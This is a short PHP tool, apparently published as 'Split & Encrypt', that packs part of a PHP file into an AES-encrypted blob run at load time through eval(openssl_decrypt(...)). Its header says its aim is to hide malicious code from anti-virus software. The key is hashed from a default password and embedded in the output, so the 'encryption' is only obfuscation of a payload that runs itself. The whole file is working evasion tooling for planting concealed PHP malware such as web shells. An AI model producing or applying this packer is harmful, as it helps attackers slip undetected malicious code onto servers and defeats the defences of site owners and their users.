<?php
// Split & Encrypt
// Copyright (C) 2020 GramThanos
//
// This code splits the given PHP code on the SPLIT&ENCRYPTme flag and 
// packs the rest of the file into an self decrypted AES encryption using
// openssl_encrypt. The aim of the code is to hide a malicious code from
// anti-virus softwares.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//

// Input file and output
$input = 'input.php';
$output = 'output.php';

// Get IP and Port from CMD arguments
if (isset($argv)) {
	if (isset($argv[1])) $input = $argv[1];
	if (isset($argv[2])) $output = $argv[2];
}

// Let user select password [default is banana]
print('Insert password [banana]: ');
$password = trim(fgets(STDIN));
if (strlen($password) < 1) $password = 'banana';
// Load code to encrypt
$code = file_get_contents($input);
if (!$code) {
	echo("Failed to load " . $input . "\n");
	exit();
}
$code = explode("SPLIT&ENCRYPTme", $code);
if (count($code) == 1) {
	echo("No SPLIT&ENCRYPTme flag found. Packing the whole code...\n");
	$code = array("<?php\n// ", "?>" . $code[0]);
}
// Encrypt code
$hash = hash('sha256', $password, true);
$iv = openssl_random_pseudo_bytes(16);
$ciphercode = openssl_encrypt($code[1], 'AES-256-CBC', $hash, OPENSSL_RAW_DATA, $iv);
// Save output to file
$r = file_put_contents($output, $code[0] . "SPLIT&ENCRYPTed\n" . "eval(openssl_decrypt(\n\tbase64_decode('" . base64_encode($ciphercode) . "'),\n\t'AES-256-CBC',\n\tbase64_decode('" . base64_encode($hash) . "'),\n\tOPENSSL_RAW_DATA,\n\tbase64_decode('" . base64_encode($iv) . "')\n));\n");
if ($r === False)
	echo("Failed to save as " . $output . "\n");
else
	echo("Saved as " . $output . "\n");
